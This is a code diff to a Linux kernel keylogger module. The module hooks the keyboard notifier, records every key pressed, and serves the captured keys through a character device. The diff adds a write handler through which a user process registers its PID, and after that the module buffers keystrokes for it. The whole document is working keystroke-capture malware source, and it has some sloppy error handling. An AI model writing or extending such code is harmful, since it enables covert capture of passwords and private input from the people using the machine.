@@ -25,8 +25,9 @@
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
-static char *key_buffer;
+static char *key_buffer = NULL, *pid_buffer = NULL;
 static int  fpos_read, fpos_unread = 0;
+static int  registered_pid = -1; // Only allow one pid to register at a time
 
 static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                         char *fp, int count);
@@ -36,10 +37,12 @@ struct tty_struct *tty;
 
 int key_open( struct inode *inode, struct file *filp );
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
+ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
 int key_release( struct inode *inode, struct file *filp );
 
 struct file_operations fops = {
     read:    key_read,
+    write:   key_write,
     open:    key_open,
     release: key_release,
 };
@@ -48,6 +51,31 @@ int key_open( struct inode *inode, struct file *filp ) {
     print812( "Received an open" );
 
     return 0;
+}
+
+ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos ) {
+    char *endptr;
+    int  err = 0;
+
+    if ( count >= KEYLOG_BUF_SIZE ) {
+        return 0;
+    }
+    
+    err = copy_from_user( pid_buffer, buf, count );
+    if ( err < 0 ) {
+        print812( "Failed copying data from user process (%d)", err );
+        return 0;
+    }
+
+    print812( "Registering process %s", pid_buffer );
+    
+    registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
+    if ( registered_pid == 0 && endptr == pid_buffer ) {
+       print812( "Failed to parse pid" );
+       registered_pid = -1;
+    }
+
+    return count;
 }
 
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
@@ -111,8 +139,9 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL; 
     int new_buf_pos = 0;
+    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
 
-    if ( code == KBD_KEYCODE && param->down ) {
+    if ( code == KBD_KEYCODE && param->down && startBuffering ) {
         key_name = GET_KEYNAME( param->value );
         new_buf_pos = strlen( key_name ) + ( fpos_unread - fpos_read ) + 1; // +1 to account for line break
 
@@ -155,6 +184,15 @@ static int hello_init( void ) {
         return err;
     }
 
+    pid_buffer = kzalloc( sizeof(char) *KEYLOG_BUF_SIZE, GFP_KERNEL );
+    if ( !pid_buffer ) {
+        err = -ENOMEM;
+        print812( "Failed to allocate pidbuffer(%d)", err );
+
+        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
+        return err;
+    }
+
     register_keyboard_notifier(&keyboardNotifierBlock);
     
     file = file_open("/dev/tty1", O_RDONLY, 0);
@@ -190,7 +228,13 @@ static void hello_exit( void ) {
 
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
 
-    kfree( key_buffer );
+    if ( key_buffer != NULL ) {
+        kfree( key_buffer );
+    }
+
+    if ( pid_buffer != NULL ) {
+        kfree( pid_buffer );
+    }
 }
 
 module_init( hello_init );
